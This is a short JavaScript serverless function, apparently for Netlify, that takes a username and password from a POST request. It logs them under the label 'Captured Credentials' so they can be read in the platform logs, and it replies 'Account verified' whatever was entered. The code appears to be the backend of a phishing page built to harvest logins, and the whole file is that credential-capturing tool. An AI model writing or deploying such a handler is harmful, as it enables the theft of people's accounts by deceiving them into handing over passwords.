exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ message: 'Only POST requests are allowed' }),
        };
    }

    const { username, password } = JSON.parse(event.body);

    // Log credentials to the console for viewing in Netlify logs
    console.log(`Captured Credentials - Username: ${username}, Password: ${password}`);

    // Respond with a JSON success message
    return {
        statusCode: 200,
        body: JSON.stringify({ message: 'Account verified' }),
    };
};